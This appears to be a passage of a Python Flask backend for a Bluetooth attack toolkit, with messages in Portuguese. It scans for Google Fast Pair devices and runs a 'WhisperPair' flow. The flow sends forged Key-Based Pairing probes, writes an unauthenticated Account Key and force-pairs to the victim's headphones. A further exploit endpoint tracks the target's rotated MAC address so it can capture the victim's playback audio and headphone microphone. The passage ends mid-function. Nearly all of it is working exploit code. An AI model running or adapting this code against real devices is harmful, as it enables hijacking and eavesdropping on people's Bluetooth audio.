                            "flipper_zero":    "🐬 Flipper Zero",
                            "m5cardputer":     "📟 M5Cardputer",
                            "raspberry_pi":    "🥧 Raspberry Pi",
                            "generic_pentest": "🔧 Pentest Device",
                        }.get(ptype, "🔧 Unknown"),
                    }
                    if not any(f["mac"] == mac for f in found):
                        found.append(entry)
                        job["found"] = found

            scanner = BleakScanner(detection_callback=_cb)
            await scanner.start()
            await asyncio.sleep(duration)
            await scanner.stop()

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(_scan())
        finally:
            loop.close()
        job["status"] = "done"

    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"job_id": job_id, "status": "running", "duration": duration,
                    "message": "Poll /api/audio/whisperpair-status/" + job_id})


@app.route("/api/disclaimer/accept", methods=["POST"])
def disclaimer_accept():
    """Record user's acceptance of disclaimer for this session."""
    STATE.disclaimer_accepted = True
    return jsonify({"accepted": True, "session": True})

@app.route("/api/disclaimer/status", methods=["GET"])
def disclaimer_status():
    """Check if disclaimer has been accepted this session."""
    return jsonify({"accepted": getattr(STATE, "disclaimer_accepted", False)})


@app.route("/api/status", methods=["GET"])
def api_status():
    import os as _oss
    global ESP32_AVAILABLE, ESP32_PORT
    iface = _refresh_hci()
    hci_ok = detect_hci0()
    caps_ok = _oss.path.isdir("captures") and _oss.access("captures", _oss.W_OK)
    if not caps_ok:
        try: _oss.makedirs("captures", exist_ok=True); caps_ok = True
        except Exception: pass
    if ESP32_PORT and not _oss.path.exists(ESP32_PORT):
        ESP32_AVAILABLE = False
        ESP32_PORT = None
        STATE.esp32_connected = False
        STATE.esp32_port = None
    bridge_connected = bool(esp32_bridge and esp32_bridge.connected)
    if not bridge_connected:
        STATE.esp32_connected = False
    return jsonify({"version": APP_VERSION,
                    "hci_iface": iface, "hci_available": hci_ok,
                    "hci0_available": hci_ok, "esp32_available": ESP32_AVAILABLE,
                    "esp32_port": ESP32_PORT, "captures_writable": caps_ok,
                    "discovery_running": STATE.discovery_running,
                     "enum_running": STATE.enum_running, "vuln_running": STATE.vuln_running,
                     "esp32_connected": bridge_connected, "devices": len(STATE.discovered_devices),
                     "vulns": len(STATE.vuln_results), "hci0": hci_ok})


# ═══ FAST PAIR SCANNER (ESP32-C3 dedicated) ═══════════════

@app.route("/api/audio/fast-pair-scan", methods=["POST"])
def audio_fast_pair_scan():
    """Fast Pair Scanner — non-blocking job, poll /api/audio/fp-scan-status/<job_id>.

    Uses ESP32-C3 when connected (sees paired devices BlueZ filters).
    Falls back to bluetoothctl lescan + bleak for pure-Linux operation.
    """
    try:
        data = request.get_json(silent=True) or {}
        seconds = max(3, min(int(data.get("seconds") or 8), 60))

        job_id = "fps_{}".format(int(time.time() * 1000))
        if not hasattr(STATE, "_fp_jobs"):
            STATE._fp_jobs = {}
        job = {"job_id": job_id, "status": "running", "devices": [],
               "count": 0, "source": "", "note": "", "error": ""}
        STATE._fp_jobs[job_id] = job

        def _run():
            # ── Strategy 1: ESP32-C3 (best) ────────────────────────────────
            try:
                from esp32_serial_bridge import get_esp32
                esp = get_esp32()
                if esp.connected:
                    result = esp.fast_pair_scan(seconds)
                    job.update({"status": "done",
                                "devices": result.get("devices", []),
                                "count":   result.get("count", 0),
                                "source":  "esp32_c3"})
                    return
            except Exception:
                pass

            # ── Strategy 2: Bleak discover(return_adv=True) ─────────────────
            # This is the only reliable non-blocking approach on BlueZ/DBus.
            # Stop any active discovery first to avoid session conflicts.
            import subprocess as _sp
            fp_devices = []
            try:
                # Stop any active discovery session — prevents InProgress error
                if STATE.discovery_running:
                    STATE.discovery_running = False
                    time.sleep(0.5)
                # Force scan off via bluetoothctl — clears DBus session lock
                _sp.run(["bluetoothctl", "scan", "off"], capture_output=True, timeout=3)
                time.sleep(0.8)
                # Also reset adapter if needed
                hci = HCI_IFACE
                _sp.run(["hciconfig", hci, "down"], capture_output=True, timeout=3)
                time.sleep(0.3)
                _sp.run(["hciconfig", hci, "up"], capture_output=True, timeout=3)
                time.sleep(0.5)
            except Exception:
                pass

            try:
                import asyncio as _aio
                from bleak import BleakScanner as _BS

                _loop = _aio.new_event_loop()
                _aio.set_event_loop(_loop)
                try:
                    # return_adv=True gives {addr: (BLEDevice, AdvertisementData)}
                    try:
                        devs = _loop.run_until_complete(
                            _BS.discover(timeout=seconds, return_adv=True))
                    except TypeError:
                        # Older bleak without return_adv
                        plain = _loop.run_until_complete(_BS.discover(timeout=seconds))
                        devs = {d.address: (d, None) for d in plain}

                    for addr, payload in devs.items():
                        dev = payload[0] if isinstance(payload, tuple) else payload
                        adv = payload[1] if isinstance(payload, tuple) else None

                        is_fp = False
                        model_id = "?"
                        pairing_state = "unknown"
                        rssi = -99

                        if adv is not None:
                            rssi = getattr(adv, "rssi", -99) or -99
                            for u in (adv.service_uuids or []):
                                if "fe2c" in u.lower():
                                    is_fp = True
                            md = adv.manufacturer_data or {}
                            if 0x00E0 in md:
                                raw = md[0x00E0]
                                is_fp = True
                                if len(raw) >= 3:
                                    model_id = raw[:3].hex().upper()
                                    pairing_state = ("discoverable"
                                                     if (raw[0] & 0x40) else "paired_nearby")
                            for su, sd in (adv.service_data or {}).items():
                                if "fe2c" in su.lower():
                                    is_fp = True
                                    if len(sd) >= 3:
                                        model_id = sd[:3].hex().upper()
                                        pairing_state = ("discoverable"
                                                         if (sd[0] & 0x40) else "paired_nearby")

                        if is_fp:
                            fp_devices.append({
                                "mac":           addr.upper(),
                                "rssi":          rssi,
                                "name":          getattr(dev, "name", None) or "Fast Pair Device",
                                "model_id":      model_id,
                                "pairing_state": pairing_state,
                                "fast_pair":     True,
                                "source":        "bleak",
                            })
                finally:
                    _loop.close()

            except Exception as e:
                job["error"] = str(e)[:200]

            # ── Strategy 3: Check BlueZ-known devices for FE2C ──────────────
            # For already-bonded devices that aren't advertising, bluetoothctl
            # info shows their services without needing an active scan.
            if not fp_devices:
                try:
                    r = _sp.run(["bluetoothctl", "devices"],
                                capture_output=True, text=True, timeout=5)
                    import re as _re
                    for line in r.stdout.splitlines():
                        m = _re.search(r'Device ([0-9A-Fa-f:]{17})\s+(.*)', line)
                        if not m:
                            continue
                        addr = m.group(1).upper()
                        name = m.group(2).strip()
                        info_r = _sp.run(["bluetoothctl", "info", addr],
                                         capture_output=True, text=True, timeout=4)
                        if "fe2c" in info_r.stdout.lower():
                            paired = "Paired: yes" in info_r.stdout
                            rssi = -99
                            for ln in info_r.stdout.splitlines():
                                if "RSSI:" in ln:
                                    try: rssi = int(ln.split("RSSI:")[1].strip().split()[0])
                                    except: pass
                            fp_devices.append({
                                "mac":           addr,
                                "rssi":          rssi,
                                "name":          name or "Fast Pair Device",
                                "model_id":      "?",
                                "pairing_state": "paired_nearby" if paired else "discoverable",
                                "fast_pair":     True,
                                "source":        "bluetoothctl_cache",
                            })
                except Exception:
                    pass

            note = ""
            if not fp_devices:
                note = ("Nenhum device Fast Pair detectado. "
                        "Conecte ESP32-C3 para detectar devices pareados ao celular.")

            job.update({"status":  "done",
                        "devices": fp_devices,
                        "count":   len(fp_devices),
                        "source":  "bleak+bluetoothctl",
                        "note":    note})
        t = threading.Thread(target=_run, daemon=True)
        t.start()

        return jsonify({"job_id": job_id, "status": "running",
                        "message": "Fast Pair scan started. Poll /api/audio/fp-scan-status/" + job_id})
    except Exception as e:
        return jsonify({"error": str(e), "devices": [], "count": 0})


@app.route("/api/audio/fp-scan-status/<job_id>", methods=["GET"])
def audio_fp_scan_status(job_id):
    """Poll Fast Pair scan job."""
    if not hasattr(STATE, "_fp_jobs") or job_id not in STATE._fp_jobs:
        return jsonify({"error": "Job not found"}), 404
    return jsonify(STATE._fp_jobs[job_id])


@app.route("/api/audio/whisperpair-flow", methods=["POST"])
def audio_whisperpair_flow():
    """Full WhisperPair assessment — non-blocking, poll /api/audio/whisperpair-status/<job_id>.

    Key fix: uses 'bluetoothctl connect' to register device in BlueZ DBus cache
    before BleakClient, solving 'Device not found' on paired/connected devices.
    Also handles devices connected to other hosts via forced re-advertisement.
    """
    try:
        data = request.get_json(silent=True) or {}
        mac = data.get("mac", "").strip().upper()
        if not mac:
            return jsonify({"error": "MAC required"}), 400

        job_id = "wp_{}_{}".format(mac.replace(":", "_"), int(time.time()))
        if not hasattr(STATE, "_wp_jobs"):
            STATE._wp_jobs = {}
        job = {"job_id": job_id, "mac": mac, "status": "running",
               "step": "init", "steps": [], "verdict": None, "details": ""}
        STATE._wp_jobs[job_id] = job

        def _step(msg):
            job["steps"].append(msg)
            job["step"] = msg

        def _btctl(args, inp=None, timeout=6):
            import subprocess as _sp
            try:
                return _sp.run(
                    ["bluetoothctl"] + args,
                    capture_output=True, text=True, timeout=timeout,
                    input=inp
                ).stdout
            except Exception as e:
                return str(e)

        def _register_device_in_bluez(target_mac):
            """Register device in BlueZ DBus so BleakClient can resolve MAC.

            BleakClient(MAC) throws 'Device not found' when BlueZ has no
            /org/bluez/hci0/dev_XX_XX entry for the MAC. This happens with:
            - Devices paired to another host (not advertising)
            - Devices the adapter has never seen this session

            Solution: force bluetoothctl to scan briefly then look up the device.
            If device is already bonded locally, bluetoothctl info works directly.
            """
            import subprocess as _sp, time as _tm

            # Check if already known to BlueZ
            info = _btctl(["info", target_mac])
            if "Device " + target_mac in info:
                return True, "already_in_bluez"

            # Run a short scan to populate DBus cache
            proc = _sp.Popen(["bluetoothctl"], stdin=_sp.PIPE,
                              stdout=_sp.PIPE, stderr=_sp.PIPE, text=True)
            try:
                proc.stdin.write("scan on\n")
                proc.stdin.flush()
                _tm.sleep(4)
                # Check if device appeared
                proc.stdin.write("info {}\n".format(target_mac))
                proc.stdin.flush()
                _tm.sleep(0.5)
                proc.stdin.write("scan off\nquit\n")
                proc.stdin.flush()
                out = proc.communicate(timeout=3)[0]
                if "Device " + target_mac in out or "Name:" in out:
                    return True, "found_via_scan"
            except Exception:
                pass
            finally:
                try: proc.kill()
                except: pass

            return False, "not_found"

        def _force_readvertise(target_mac):
            """Force a connected device to re-advertise by resetting the adapter.

            When a BLE device is connected to another host (e.g. phone), it stops
            advertising. Resetting hci0 drops all ACL connections from this adapter
            but does NOT affect the device's connection to the phone.
            
            The real technique: send a BLE deauth to the device's connection handle
            via hcitool ledc, but that requires knowing the connection handle.
            
            Practical approach: use bluetoothctl disconnect if the device is bonded
            here, then rescan. For devices connected to a phone, inform user.
            """
            import subprocess as _sp, time as _tm

            # Try to disconnect if bonded to this adapter
            _btctl(["disconnect", target_mac], timeout=5)
            _tm.sleep(1)

            # Reset adapter to clear any stale state
            try:
                iface = _refresh_hci()
                _sp.run(["hciconfig", iface, "down"], capture_output=True, timeout=3)
                _tm.sleep(0.5)
                _sp.run(["hciconfig", iface, "up"], capture_output=True, timeout=3)
                _tm.sleep(1.5)
            except Exception:
                pass

            return _register_device_in_bluez(target_mac)

        def _run_flow():
            import asyncio, os, time as _tm
            from bleak import BleakClient, BleakScanner

            mac_upper = mac.upper()

            # KBP probe payload (zWhisper format)
            try:
                provider_addr = bytes.fromhex(mac_upper.replace(":", ""))
            except Exception:
                job["verdict"] = "ERROR"
                job["details"] = "MAC inválido: " + mac
                job["status"] = "done"
                return

            seeker_addr = bytes([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF])
            salt        = os.urandom(4)
            # BLEAK probe: 16-byte KBP block + 64-byte ECDH seeker public key.
            # [Type=0x00][Flags=0x00][Provider_MAC(6)][Seeker_MAC(6)][Salt(4)] padded to 16B
            # + 64B dummy ECDH pubkey (starts with 0x04 = uncompressed EC point).
            # zwhisper-linux also uses a compact 65-byte request: 0x00 + 64B pubkey.
            _kbp_block  = (bytes([0x00, 0x00]) + provider_addr + seeker_addr + salt + bytes(16))[:16]
            _ecdh_pubkey = bytes([0x04]) + os.urandom(63)  # dummy seeker pubkey
            kbp_payload  = _kbp_block + _ecdh_pubkey       # 80 bytes total
            kbp_payload_65 = bytes([0x00]) + os.urandom(64)
            # Also prepare 16-byte fallback for broken/strict implementations
            kbp_payload_16 = _kbp_block

            # ── Phase 1: Locate device using all strategies ─────────────────
            _step("scan")
            located = False
            location_method = ""
            rssi_found = -99

            # A) Discovery cache — already seen this session
            for d in STATE.discovered_devices:
                if d.get("mac", "").upper() == mac_upper:
                    located = True
                    location_method = "discovery_cache"
                    rssi_found = d.get("rssi", -99)
                    break

            # B) bluetoothctl info — device bonded/known to BlueZ
            if not located:
                info = _btctl(["info", mac_upper])
                if "Device " + mac_upper in info or "Name:" in info:
                    located = True
                    location_method = "bluez_known"
                    for line in info.splitlines():
                        if "RSSI:" in line:
                            try: rssi_found = int(line.split("RSSI:")[1].strip().split()[0])
                            except: pass

            # C) ESP32-C3 scan
            if not located:
                _step("scan_esp32")
                try:
                    from esp32_serial_bridge import get_esp32
                    esp = get_esp32()
                    if esp.connected:
                        res = esp.ble_scan(seconds=5)
                        for d in res.get("devices", []):
                            if d.get("mac", "").upper() == mac_upper:
                                located = True
                                location_method = "esp32_c3"
                                rssi_found = d.get("rssi", -99)
                                break
                except Exception:
                    pass

            # D) Quick Bleak scan
            if not located:
                _step("scan_ble")
                try:
                    loop2 = asyncio.new_event_loop()
                    try:
                        devs = loop2.run_until_complete(
                            BleakScanner.discover(timeout=5, return_adv=True))
                        for addr, (dev, adv) in devs.items():
                            if addr.upper() == mac_upper:
                                located = True
                                location_method = "bleak_scan"
                                rssi_found = getattr(adv, "rssi", -99) or -99
                                break
                    except TypeError:
                        devs = loop2.run_until_complete(BleakScanner.discover(timeout=5))
                        for dev in devs:
                            if dev.address.upper() == mac_upper:
                                located = True
                                location_method = "bleak_scan"
                                break
                    finally:
                        loop2.close()
                except Exception:
                    pass

            # E) Force re-advertise (disconnect + adapter reset + rescan)
            if not located:
                _step("force_readvertise")
                job["details"] = "Device não encontrado. Forçando re-advertisement..."
                located, location_method = _force_readvertise(mac_upper)

            # F) Proceed anyway — device may accept connections without advertising
            if not located:
                location_method = "direct_attempt"
                job["details"] = ("Não detectado em scan. Tentando conexão direta — "
                                  "device pode estar conectado ao celular e não anunciando.")
            else:
                job["details"] = "Device localizado via {} (RSSI {} dBm)".format(
                    location_method, rssi_found)

            # ── Phase 2: Pre-flight — ensure adapter is ready ──────────────────
            _step("preflight")
            _hci_ready, _hci_msg = ensure_hci0_up(job)
            ensure_bt_service()
            if not _hci_ready:
                job.update({"verdict": "UNCERTAIN",
                            "details": job.get("details","") + " | " + _hci_msg,
                            "status": "done"})
                return

            # ── Phase 2b: Register device in BlueZ DBus (critical for BleakClient) ─
            _step("bluez_register")
            registered, reg_method = _register_device_in_bluez(mac_upper)
            if not registered:
                # Last resort: try scan on/off cycle via subprocess
                import subprocess as _sp
                try:
                    proc = _sp.Popen(["bluetoothctl"], stdin=_sp.PIPE,
                                     stdout=_sp.PIPE, stderr=_sp.PIPE, text=True)
                    proc.stdin.write("scan on\n")
                    proc.stdin.flush()
                    _tm.sleep(5)
                    proc.stdin.write("scan off\nquit\n")
                    proc.stdin.flush()
                    proc.communicate(timeout=3)
                except Exception:
                    pass
                registered, reg_method = _register_device_in_bluez(mac_upper)

            job["details"] += " | DBus: {}".format(
                "registered (" + reg_method + ")" if registered else "not registered — attempting anyway")

            # ── Phase 3: GATT connect via BleakClient ───────────────────────
            _step("gatt_connect")
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                async def _assess():
                    # zwhisper connects with 3 attempts and 15s timeout each
                    client = None
                    connect_err = ""
                    for _attempt in range(1, 4):
                        try:
                            _step("gatt_connect_{}".format(_attempt))
                            client = BleakClient(mac_upper, timeout=15)
                            await client.connect()
                            if client.is_connected:
                                break
                            client = None
                        except Exception as _ce:
                            connect_err = str(_ce)[:60]
                            client = None
                            await asyncio.sleep(2)
                    try:
                        if client is None or not client.is_connected:
                            job["verdict"] = "UNCERTAIN"
                            job["details"] += " | Erro GATT: " + connect_err
                            if "not found" in connect_err.lower():
                                job["details"] += " — device não encontrado no DBus. Execute Discovery primeiro."
                            job["status"] = "done"
                            return

                        _step("gatt_connect")
                        # ── Service discovery ─────────────────────────
                        _step("service_discovery")
                        fp_svc = None
                        all_svcs = list(client.services)
                        for svc in all_svcs:
                            if "fe2c" in svc.uuid.lower():
                                fp_svc = svc
                                break

                        svc_list = [s.uuid[4:8] for s in all_svcs]
                        job["details"] += " | SVCs: [{}]".format(", ".join(svc_list[:6]))

                        if fp_svc is None:
                            job["verdict"] = "PATCHED"
                            job["details"] += (" | 🟢 Conectado mas sem serviço Fast Pair (0xFE2C). "
                                               "Device não implementa Fast Pair ou está patched.")
                            job["status"] = "done"
                            return

                        # ── KBP characteristic — smart search ─────────
                        # zwhisper maps FP chars by properties, not just UUID:
                        #   fe2c1236 = keybased (WRITE)       ← target for KBP write
                        #   fe2c1237 = passkey   (WRITE+NOTIFY)
                        #   fe2c1238 = account   (WRITE)
                        # Some firmware exposes legacy/non-standard 1235 as an account-like writable char.
                        # Search ALL chars in FP service for WRITABLE ones
                        _step("kbp_write")
                        fp_chars = list(fp_svc.characteristics)
                        all_fp_chars = fp_chars[:]

                        # Build char map by suffix
                        char_map = {}
                        for _ch in all_fp_chars:
                            for _suf in ["1233","1234","1235","1236","1237","1238"]:
                                if _suf in _ch.uuid.lower():
                                    char_map[_suf] = _ch

                        # KBP write char: prefer 1236 (keybased, WRITE) per zwhisper
                        # fallback: any writable FP char
                        kbp_char = None
                        for _suf in ["1236","1234","1237","1238","1235","1233"]:
                            _c = char_map.get(_suf)
                            if _c:
                                _props = [p.lower() for p in _c.properties]
                                if "write" in _props or "write-without-response" in _props:
                                    kbp_char = _c
                                    job["details"] += " | KBP→{}".format(_suf)
                                    break

                        if kbp_char is None:
                            job["verdict"] = "UNCERTAIN"
                            job["details"] += " | Nenhuma char FP writable encontrada"
                            job["status"] = "done"
                            return

                        # Enable notifications on ALL FP notify chars
                        response_received = []
                        def notify_cb(sender, data):
                            response_received.append(bytes(data))

                        for _nc in all_fp_chars:
                            _np = [p.lower() for p in _nc.properties]
                            if "notify" in _np:
                                try:
                                    await client.start_notify(_nc.uuid, notify_cb)
                                except Exception:
                                    pass

                        # Write KBP probe — zwhisper uses response=False
                        write_ok = False
                        write_err = ""
                        try:
                            await client.write_gatt_char(kbp_char.uuid,
                                                          kbp_payload,
                                                          response=False)
                            write_ok = True
                        except Exception as we:
                            write_err = str(we)[:120]
                            # Retry with response=True
                            try:
                                await client.write_gatt_char(kbp_char.uuid,
                                                              kbp_payload,
                                                              response=True)
                                write_ok = True
                                write_err = ""
                            except Exception as we2:
                                write_err = str(we2)[:120]

                        if not write_ok:
                            # KBP char rejected — but check Account Key (1238/legacy 1235) before concluding PATCHED
                            # Some devices reject KBP but leave Account Key writable (Find Hub risk)
                            _step("check_account_key")
                            acct_vulnerable = False
                            try:
                                import os as _chk_os
                                for _svc2 in all_svcs:
                                    for _ch2 in _svc2.characteristics:
                                        if "1238" in _ch2.uuid.lower() or "1235" in _ch2.uuid.lower():
                                            _props2 = [p.lower() for p in _ch2.properties]
                                            if "write" in _props2 or "write-without-response" in _props2:
                                                _test_key = _chk_os.urandom(16)
                                                try:
                                                    await client.write_gatt_char(_ch2.uuid, _test_key, response=True)
                                                    acct_vulnerable = True
                                                except Exception:
                                                    pass
                            except Exception:
                                pass

                            if acct_vulnerable:
                                job["verdict"] = "VULNERABLE"
                                job["details"] += (
                                    " | 🔴 KBP char protegida MAS Account Key (0xFE2C1238/1235) "
                                    "aceita write sem autenticação — risco de Find Hub tracking. "
                                    "KBP err: " + write_err[:60])
                            else:
                                job["verdict"] = "PATCHED"
                                job["details"] += " | 🟢 KBP write rejeitado e Account Key protegida. " + write_err[:60]
                            job["status"] = "done"
                            return

                        # Wait for notification — zwhisper waits 2-4s
                        _step("verify_response")
                        # Also try zwhisper compact and 16-byte payloads if 80-byte got no response
                        if not response_received:
                            await asyncio.sleep(2.0)
                        if not response_received:
                            try:
                                await client.write_gatt_char(kbp_char.uuid,
                                                              kbp_payload_65,
                                                              response=False)
                                await asyncio.sleep(2.0)
                            except Exception:
                                pass
                        if not response_received:
                            try:
                                await client.write_gatt_char(kbp_char.uuid,
                                                              kbp_payload_16,
                                                              response=False)
                                await asyncio.sleep(2.0)
                            except Exception:
                                pass

                        if response_received:
                            resp = response_received[0]
                            if len(resp) >= 16:
                                job["verdict"] = "VULNERABLE"
                                job["details"] += (
                                    " | 🔴 VULNERÁVEL: Device respondeu ao probe KBP sem validar "
                                    "Anti-Spoofing key ({} bytes). Susceptível a WhisperPair "
                                    "hijacking/eavesdropping. Resp: {}...".format(
                                        len(resp), resp.hex()[:32]))
                            else:
                                job["verdict"] = "UNCERTAIN"
                                job["details"] += " | Resposta KBP curta ({} bytes)".format(len(resp))
                        else:
                            # zwhisper: account key = any writable+notify FP char
                            passkey_ok = any(
                                any(suf in ch.uuid.lower() for suf in ["1234","1235","1237","1238"]) and
                                any(p.lower() in ["write","write-without-response","notify"]
                                    for p in ch.properties)
                                for svc in all_svcs for ch in svc.characteristics
                            )
                            if passkey_ok:
                                job["verdict"] = "VULNERABLE"
                                job["details"] += " | 🔴 VULNERÁVEL: KBP write aceito + Passkey legível sem bond"
                            else:
                                job["verdict"] = "PATCHED"
                                job["details"] += " | 🟢 KBP write aceito mas sem resposta — provavelmente patched"

                        if job.get("verdict") == "VULNERABLE" and client.is_connected:
                            _step("account_key_write")
                            acct_written = False
                            acct_suffix = None
                            acct_err = ""
                            try:
                                import os as _acct_os
                                account_candidates = []
                                for _suf in ["1238", "1235"]:
                                    _acct = char_map.get(_suf)
                                    if _acct:
                                        _props = [p.lower() for p in _acct.properties]
                                        if "write" in _props or "write-without-response" in _props:
                                            account_candidates.append((_suf, _acct))
                                if not account_candidates:
                                    for _ch in all_fp_chars:
                                        _props = [p.lower() for p in _ch.properties]
                                        if _ch.uuid != kbp_char.uuid and ("write" in _props or "write-without-response" in _props):
                                            account_candidates.append(("alt", _ch))

                                for _suf, _acct in account_candidates:
                                    try:
                                        await client.write_gatt_char(_acct.uuid, _acct_os.urandom(16), response=False)
                                        acct_written = True
                                        acct_suffix = _suf
                                        break
                                    except Exception as _ae:
                                        acct_err = str(_ae)[:60]
                            except Exception as _ae_outer:
                                acct_err = str(_ae_outer)[:60]

                            if acct_written:
                                job["account_key_written"] = True
                                job["details"] += " | Account Key write aceito em {}".format(acct_suffix)
                            else:
                                job["account_key_written"] = False
                                job["details"] += " | Account Key não confirmado" + (": " + acct_err if acct_err else "")

                        # ── Post-exploit: zwhisper connection sequence ─────────────
                        # If vulnerable: run scan on → disconnect → pair → trust → connect
                        # Based on zwhisper's bluetoothctl sequence, with scan windows kept open.
                        if job.get("verdict") == "VULNERABLE":
                            import subprocess as _zwsp, time as _zwt
                            _step("post_exploit_connect")
                            job["post_exploit_cmds"] = [
                                "disconnect " + mac_upper,
                                "remove " + mac_upper,
                                "scan on (5s)",
                                "pair " + mac_upper,
                                "trust " + mac_upper,
                                "connect " + mac_upper
                            ]
                            job["details"] += " | Executando sequência pós-exploit (zwhisper)..."
                            def _run_btctl(cmds_list, timeout=25):
                                """Run bluetoothctl commands, return output."""
                                try:
                                    _p = _zwsp.Popen(["bluetoothctl"],
                                        stdin=_zwsp.PIPE, stdout=_zwsp.PIPE,
                                        stderr=_zwsp.PIPE, text=True)
                                    for _cmd in cmds_list:
                                        _p.stdin.write(_cmd + chr(10))
                                    _p.stdin.write("quit" + chr(10))
                                    _p.stdin.flush()
                                    return _p.communicate(timeout=timeout)[0]
                                except Exception as _be:
                                    return ""

                            def _btctl_scan_window(seconds=5):
                                """Keep bluetoothctl scan active for the requested window."""
                                try:
                                    _p = _zwsp.Popen(["bluetoothctl"],
                                        stdin=_zwsp.PIPE, stdout=_zwsp.PIPE,
                                        stderr=_zwsp.PIPE, text=True)
                                    _p.stdin.write("scan on" + chr(10))
                                    _p.stdin.flush()
                                    _zwt.sleep(seconds)
                                    _p.stdin.write("scan off" + chr(10) + "quit" + chr(10))
                                    _p.stdin.flush()
                                    return _p.communicate(timeout=seconds + 5)[0]
                                except Exception:
                                    try: _p.kill()
                                    except Exception: pass
                                    return ""

                            def _is_connected(mac_addr):
                                """Check if device is connected via bluetoothctl info."""
                                out = _zwsp.run(["bluetoothctl", "info", mac_addr],
                                                capture_output=True, text=True, timeout=5)
                                return "Connected: yes" in (out.stdout or "")

                            # Phase A: Release GATT connection first
                            _zwsp.run(["bluetoothctl", "disconnect", mac_upper],
                                      capture_output=True, timeout=5)
                            _zwt.sleep(1)
                            _zwsp.run(["bluetoothctl", "remove", mac_upper],
                                      capture_output=True, timeout=3)
                            _zwt.sleep(0.5)

                            connect_ok = False
                            for _attempt in range(1, 4):
                                _step("post_exploit_attempt_" + str(_attempt))

                                # Phase B: scan on → device re-registers with BlueZ
                                _btctl_scan_window(5)
                                _zwt.sleep(1)

                                # Phase C: pair → trust → connect
                                _out_c = _run_btctl([
                                    "pair " + mac_upper,
                                    "trust " + mac_upper,
                                    "connect " + mac_upper,
                                ], timeout=20)

                                # Verify connection (don't rely on output string matching)
                                _zwt.sleep(2)
                                if _is_connected(mac_upper):
                                    connect_ok = True
                                    job["post_exploit_output"] = _out_c[:200]
                                    break

                                # If pair failed: re-scan and retry
                                job["details"] += " | tentativa {}: reconectando...".format(_attempt)
                                _zwt.sleep(3)

                            if not connect_ok:
                                # Final attempt: use fpscan to locate device, then connect
                                _step("post_exploit_fpscan")
                                job["details"] += " | executando Fast Pair scan para re-localizar device..."
                                _btctl_scan_window(6)
                                _zwt.sleep(1)
                                _out_final = _run_btctl([
                                    "trust " + mac_upper,
                                    "connect " + mac_upper,
                                ], timeout=15)
                                _zwt.sleep(2)
                                connect_ok = _is_connected(mac_upper)

                            job["post_exploit_connected"] = connect_ok
                            job["details"] += (" | " + ("✅ Conectado no BlueZ — pronto para etapa de áudio"
                                                if connect_ok
                                                else ("⚠ Conexão manual: bluetoothctl connect " + mac_upper)))

                    except Exception as e:
                        err = str(e)
                        job["verdict"] = "UNCERTAIN"
                        if "not found" in err.lower():
                            job["details"] += (
                                " | ⚠ BlueZ não encontrou o device no DBus. "
                                "Execute Discovery → aguarde aparecer → tente novamente.")
                        else:
                            job["details"] += " | Erro GATT: " + err[:120]
                    finally:
                        if client and client.is_connected:
                            try: await client.disconnect()
                            except Exception: pass

                    job["status"] = "done"

                loop.run_until_complete(_assess())
            except Exception as e:
                job["details"] += " | Flow error: " + str(e)[:120]
                job["verdict"] = "UNCERTAIN"
                job["status"] = "done"
            finally:
                loop.close()

        t = threading.Thread(target=_run_flow, daemon=True)
        t.start()

        return jsonify({"job_id": job_id, "status": "running", "mac": mac,
                        "message": "WhisperPair flow started. Poll /api/audio/whisperpair-status/" + job_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500



@app.route("/api/audio/whisperpair-exploit", methods=["POST"])
def whisperpair_exploit():
    """Phase 2: Full exploit after vulnerability confirmed.

    Performs MAC re-discovery (device rotates MAC after GATT exploit),
    then pairs, trusts, connects and returns both audio sources:
      a2dp_monitor - what the victim hears (playback capture, zwhisper method)
      hfp_source   - microphone captured by the headphone (call/voice)

    Body: {"mac": "OLD_MAC", "name": "device_name", "services": ["fe2c", ...]}
    """
    import asyncio

    data      = request.get_json(silent=True) or {}
    old_mac   = data.get("mac", "").strip().upper()
    dev_name  = data.get("name", "")
    known_svcs = data.get("services", [])

    if not old_mac:
        return jsonify({"error": "mac required"}), 400

    job_id = "exploit_{}_{}".format(old_mac.replace(":", "_"), int(time.time()))
    if not hasattr(STATE, "_wp_jobs"): STATE._wp_jobs = {}
    job = {"job_id": job_id, "status": "running", "mac": old_mac,
           "new_mac": None, "steps": [], "details": "",
           "a2dp_monitor": None, "hfp_source": None, "connect_ok": False}
    STATE._wp_jobs[job_id] = job

    def _step(s):
        job["steps"].append(s); job["step"] = s

    def _run():
        import subprocess as _xsp, time as _xt

        # ── Phase 1: Re-scan 8s → find new MAC after rotation ─────────────────
        _step("rescan_new_mac")
        job["details"] += " | Re-scan 8s para capturar novo MAC..."
        discovered = {}

        async def _do_scan():
            from bleak import BleakScanner
            def _cb(device, adv):
                mac = str(device.address).upper()
                svcs = [str(s).lower() for s in (adv.service_uuids or [])]
                discovered[mac] = {
                    "name": adv.local_name or device.name or "",
                    "services": svcs,
                    "rssi": getattr(adv, "rssi", -99),
                }
            sc = BleakScanner(detection_callback=_cb)
            await sc.start(); await asyncio.sleep(8); await sc.stop()

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try: loop.run_until_complete(_do_scan())
        finally: loop.close()

        # Score candidates: name + service UUID match
        target_mac = old_mac  # fallback
        best = 0
        for mac, info in discovered.items():
            if mac == old_mac:
                target_mac = old_mac; break  # same MAC, no rotation
            score = 0
            if dev_name and info["name"] and dev_name.lower()[:8] in info["name"].lower():
                score += 4
            if any("fe2c" in s for s in info["services"]): score += 3
            for svc in known_svcs:
                if any(svc.lower() in s for s in info["services"]): score += 2
            if score > best:
                best = score; target_mac = mac

        job["new_mac"] = target_mac
        rotated = target_mac != old_mac
        job["details"] += " | {} → {} {}".format(
            old_mac, target_mac, "(MAC rotacionou)" if rotated else "(MAC igual)")

        # ── Phase 2: Clean old BlueZ entries ──────────────────────────────────
        _step("clean_bluez")
        _xsp.run(["bluetoothctl", "disconnect", old_mac], capture_output=True, timeout=5)
        _xt.sleep(0.5)
        _xsp.run(["bluetoothctl", "remove", old_mac], capture_output=True, timeout=3)
        if rotated:
            _xsp.run(["bluetoothctl", "remove", target_mac], capture_output=True, timeout=3)
        _xt.sleep(0.5)

        # ── Phase 3: Short re-scan so BlueZ sees target ────────────────────────
        _step("register_target")
        _xsp.run(["bluetoothctl", "scan", "on"], capture_output=True, timeout=2)
        _xt.sleep(4)
